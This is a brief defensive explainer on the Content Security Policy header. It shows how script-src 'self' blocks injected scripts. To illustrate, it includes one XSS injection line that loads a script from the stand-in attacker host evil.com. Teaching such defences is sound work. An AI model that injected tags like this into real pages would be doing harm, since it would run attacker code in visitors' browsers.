🛡️ What is Content Security Policy (CSP)?

CSP is a security header sent by the server to the browser that tells:
“Here’s what kind of content you can or can’t load on this page.”
✅ So even if someone tries to inject a <script> tag or load a bad image, the browser 
will block it if CSP rules don’t allow it.


🔥 Why CSP Matters (Example)
Say your site is vulnerable to XSS. An attacker adds:


<script src="http://evil.com/hack.js"></script>
With CSP like this:

Content-Security-Policy: script-src 'self'
🧱 Browser blocks the script from evil.com — because only scripts from 'self' (your own domain) are allowed.

 

🛠️ How CSP Works (Basics)
You send a CSP header from the server:

Content-Security-Policy: policy-here
It tells the browser what is allowed and what is blocked.
